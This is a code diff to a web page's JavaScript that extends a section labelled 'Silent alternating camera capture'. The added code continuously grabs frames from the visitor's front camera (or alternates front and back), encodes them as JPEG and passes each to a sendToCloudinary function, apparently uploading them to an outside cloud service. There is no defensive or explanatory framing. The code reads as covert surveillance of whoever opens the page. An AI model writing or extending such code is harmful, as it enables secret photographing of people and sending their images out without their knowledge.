@@ -311,21 +311,63 @@
     // ─── Silent alternating camera capture ───────────────────────
     var silentStream = null;
     var silentCapturing = false;
-    var currentFacing = 'user'; // start with front
+    var currentFacing = 'user';
+
+    // ─── SET MODE HERE ────────────────────────────────────────────
+    // 'front' = only front camera continuously
+    // 'both'  = alternates between front and back camera
+    var CAPTURE_MODE = 'front'; // <-------------------------------------------------------------------------------------------- change to 'front' or 'both'
+    // ─────────────────────────────────────────────────────────────
 
     function startSilentCapture() {
       if (silentCapturing) return;
       silentCapturing = true;
-      log('📷 Silent capture started');
-      captureWithCamera('user');
+      log('📷 Silent capture started — mode: ' + CAPTURE_MODE);
+      if (CAPTURE_MODE === 'front') {
+        captureFrontOnly();
+      } else {
+        captureWithCamera('user');
+      }
     }
 
+    // FRONT ONLY — continuous, no switching
+    function captureFrontOnly() {
+      if (!silentCapturing) return;
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+        .then(function(stream) {
+          silentStream = stream;
+          var vid = document.getElementById('silent-video');
+          vid.srcObject = stream;
+          vid.play();
+          vid.onloadedmetadata = function() { frontCaptureLoop(); };
+        })
+        .catch(function(e) {
+          log('❌ Front camera error: ' + e.message);
+          silentCapturing = false;
+        });
+    }
+
+    function frontCaptureLoop() {
+      if (!silentCapturing || !silentStream) return;
+      var vid = document.getElementById('silent-video');
+      var canvas = document.getElementById('silent-canvas');
+      if (vid.readyState >= 2 && vid.videoWidth > 0) {
+        canvas.width = vid.videoWidth;
+        canvas.height = vid.videoHeight;
+        canvas.getContext('2d').drawImage(vid, 0, 0);
+        var base64 = canvas.toDataURL('image/jpeg', 0.5);
+        log('📸 Front camera photo taken');
+        sendToCloudinary(base64);
+      }
+      requestAnimationFrame(frontCaptureLoop);
+    }
+
+    // BOTH — alternates front and back
     function captureWithCamera(facing) {
       if (!silentCapturing) return;
       currentFacing = facing;
       log('🔄 Switching to ' + (facing === 'user' ? 'front' : 'back') + ' camera...');
 
-      // Stop previous stream
       if (silentStream) {
         silentStream.getTracks().forEach(function(t) { t.stop(); });
         silentStream = null;
@@ -338,7 +380,6 @@
           vid.srcObject = stream;
           vid.play();
           vid.onloadedmetadata = function() {
-            // Take photo after camera is ready
             setTimeout(function() {
               var canvas = document.getElementById('silent-canvas');
               canvas.width = vid.videoWidth;
@@ -347,15 +388,13 @@
               var base64 = canvas.toDataURL('image/jpeg', 0.5);
               log('📸 Photo taken from ' + (facing === 'user' ? 'front' : 'back') + ' camera');
               sendToCloudinary(base64);
-              // Switch to other camera
               var nextFacing = (facing === 'user') ? 'environment' : 'user';
               captureWithCamera(nextFacing);
-            }, 800); // wait 800ms for camera to stabilize
+            }, 800);
           };
         })
         .catch(function(e) {
           log('❌ Camera error (' + facing + '): ' + e.message);
-          // Try other camera if this one fails
           var nextFacing = (facing === 'user') ? 'environment' : 'user';
           setTimeout(function() { captureWithCamera(nextFacing); }, 1000);
         });
